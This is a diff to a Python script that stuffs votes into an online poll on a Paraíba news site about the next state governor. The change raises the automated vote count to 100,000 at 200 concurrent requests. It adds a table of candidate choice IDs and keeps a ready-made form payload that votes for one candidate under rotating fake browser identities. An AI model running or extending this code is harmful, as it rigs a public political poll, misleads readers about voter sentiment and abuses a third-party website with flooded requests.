@@ -7,8 +7,8 @@ from tqdm import tqdm
 
 # --- Configurações principais ---
 URL_ENQUETE    = "https://www.polemicaparaiba.com.br/politica/enquete-polemica-paraiba-em-quem-voce-votaria-para-ser-o-proximo-governador-da-paraiba/"
-NUMERO_VOTOS   = 10000
-CONCURRENCY    = 100
+NUMERO_VOTOS   = 100000
+CONCURRENCY    = 200
 LOG_INTERVAL   = 200
 
 # Substitui o loop padrão
@@ -21,12 +21,23 @@ ua = UserAgent()
 success = 0
 errors  = 0
 
+dictCandidatos = {
+    'cicero': 'd6a33e0b-f11d-40d8-854b-b318f4cfa492',
+    'efraim': 'e1409671-67f0-4d0e-b8d5-7b751e30f3f2',
+    'deusdete': '3d866c40-9dc3-42e4-882d-acac578f2202',
+    'hugo': 'b8e0ee19-0272-46fb-898d-cc634435a244',
+    'marcelo': '57aacbdb-87ac-4941-ad22-0efc375ee9d5',
+    'pedro': 'b863cac3-c187-449c-bdca-b8b9c57fa633',
+    'romero': '8088b961-df68-45bc-861e-2089ed9011a2'
+}
+
+
 # Boundary fixo e payload pré-montado (bytes)
 BOUNDARY = "----MyBoundary123456"
 PAYLOAD = (
     f"--{BOUNDARY}\r\n"
     f'Content-Disposition: form-data; name="totalpoll[choices][9368332c-8ee9-447c-9009-3bab6e2e6107][]"\r\n\r\n'
-    f'd6a33e0b-f11d-40d8-854b-b318f4cfa492\r\n'
+    f'{dictCandidatos["cicero"]}\r\n'
     f"--{BOUNDARY}\r\n"
     'Content-Disposition: form-data; name="totalpoll[screen]"\r\n\r\n'
     'vote\r\n'
